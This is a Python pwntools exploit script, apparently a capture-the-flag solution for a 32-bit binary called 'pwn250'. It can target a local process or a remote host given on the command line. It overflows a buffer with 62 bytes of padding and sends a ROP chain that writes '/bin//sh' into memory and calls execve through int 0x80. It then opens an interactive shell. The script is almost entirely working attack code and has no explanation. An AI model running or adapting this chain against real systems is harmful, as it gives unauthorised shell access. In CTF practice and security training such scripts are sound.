#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
debug = 1
if debug:
    context.log_level = "debug"
exe = "./pwn250"
e = ELF(exe)
context.arch = e.arch
context.terminal = ["tmux","splitw","-h"]

arena64 = 0x3c4b20
arena32 = 0x1b2780

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
rul = lambda x:p.recvline()
sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sea = lambda x:p.sendafter(x)
sela = lambda x:p.sendlineafter(x)

if len(sys.argv)>1:
    p = remote(sys.argv[1],int(sys.argv[2]))
#    libc = ELF("./libc.so.6")
else:
    p = process([exe])
    libc = e.libc

def csu(offset,end,front,fun_got,arg1,arg2,arg3):
    tmp = flat(["A"*offset,end,0,1,fun_got,arg3,arg2,arg1,front,"A"*0x38,vul])
    return tmp

def z():
    gdb.attach(p)

ru("]")
sl("500")
ru("]")

from struct import pack

io=p
# Padding goes here
p = 'A'*62

p += pack('<I', 0x0806efbb) # pop edx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += pack('<I', 0x080b89e6) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080549bb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806efbb) # pop edx ; ret
p += pack('<I', 0x080eb064) # @ .data + 4
p += pack('<I', 0x080b89e6) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080549bb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806efbb) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x080493a3) # xor eax, eax ; ret
p += pack('<I', 0x080549bb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += pack('<I', 0x080df1b9) # pop ecx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x0806efbb) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x080493a3) # xor eax, eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0806cbb5) # int 0x80

io.sendline(p)
io.interactive()

